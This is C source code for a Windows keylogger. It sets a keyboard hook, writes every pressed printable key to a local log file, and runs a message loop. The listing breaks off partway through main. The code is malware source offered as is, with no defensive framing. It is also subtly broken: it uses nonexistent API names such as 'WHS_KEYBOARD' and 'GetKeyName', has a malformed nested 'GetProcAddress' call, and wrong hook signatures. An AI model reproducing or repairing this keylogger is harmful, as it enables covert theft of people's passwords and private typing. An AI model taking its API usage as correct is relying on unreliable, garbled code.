// Define the maximum size of the keyboard layout
#define KEYBOARD_LAYOUT_SIZE 256

// Function prototypes
void CALLBACK KeyboardHookProc(int hEvent, int iKey, int state);
void SetupKeyboardHook(void);
void CleanUpKeyboardHook(void);

// Global variables for the hook and the log file
HHOOK hKeyboardHook = NULL;
FILE *pLog = NULL;

// Initialize the log file
void InitializeLog(void) {
    pLog = fopen("keyboard_log.txt", "a");
    if (pLog == NULL) {
        printf("Failed to create log file.\n");
    }
}

// Check if the system supports the required functions
bool IsWindowsXPOrEarlier() {
    return (GetProcAddress(GetProcAddress(GetModuleHandle("kernel32.dll"), "SetWindowsHook") == NULL);
}

// Callback function to handle keyboard events
void CALLBACK KeyboardHookProc(int hEvent, int iKey, int state) {
    if (state == 0) { // Key is pressed
        // Determine if the key is a printable character or a modifier
        char key = GetKeyName(iKey);
        if (key != '\0' && (iKey != 0x1 && iKey != 0x2 && iKey != 0x4 && iKey != 0x8)) { // Skip certain keys
            fprintf(pLog, "%c", key);
        }
    }
}

// Set up the keyboard hook
void SetupKeyboardHook(void) {
    // Check if we're running on Windows XP or earlier
    if (IsWindowsXPOrEarlier()) {
        // Use SetWindowsHook for XP and earlier
        hKeyboardHook = SetWindowsHook(WHS_KEYBOARD, KeyboardHookProc);
    } else {
        // Use SetWindowsHookEx for later Windows versions
        hKeyboardHook = SetWindowsHookEx(WHS_KEYBOARD, KeyboardHookProc, GetCurrentWindow());
    }

    // Start the hook
    StartMessageLoop(0, 0, 0);
}

// Clean up the hook and log file
void CleanUpKeyboardHook(void) {
    // Stop the message loop
    PostQuitMessage(0);

    // Remove the hook
    if (hKeyboardHook) {
        if (!IsWindowsXPOrEarlier()) {
            UnhookWindowsHook(hKeyboardHook, WHS_KEYBOARD);
        } else {
            UnhookWindowsHook(hKeyboardHook);
        }
        hKeyboardHook = NULL;
    }

    // Close the log file
    if (pLog) {
        fclose(pLog);
        pLog = NULL;
    }
}

// Main function
int main() {
    // Initialize the log file
    InitializeLog();

    // Set up the keyboard hook
    SetupKeyboardHook();

    // Wait for key events
    MSG msg;
    while (GetMessage(&msg, 0, 0, 0)) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            // Handle the event
            if (hKeyboardHook) {
                if (msg.message == WM_KEYDOWN) {
